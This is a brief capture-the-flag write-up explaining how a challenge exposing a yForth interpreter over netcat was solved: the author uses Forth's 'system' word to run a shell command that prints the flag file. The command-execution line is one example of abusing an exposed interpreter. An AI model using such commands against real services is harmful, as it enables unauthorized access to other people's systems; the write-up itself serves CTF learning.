# Forth

> Solves: 372
> Connect to 136.243.194.49:1024 and get a shell.

This was only free point challange on CTF. 

nc will give you:

> yForth? v0.2  Copyright (C) 2012  Luca Padovani
> This program comes with ABSOLUTELY NO WARRANTY.
> This is free software, and you are welcome to redistribute it
> under certain conditions; see LICENSE for details.

After quick googling we were able to see that yForth is Forth environment in ANSI C. Quick look [Rosetta code](http://rosettacode.org/wiki/Execute_a_system_command#Forth "Rosetta code") for system code execution and we can type:

> s" cat flag.txt" system

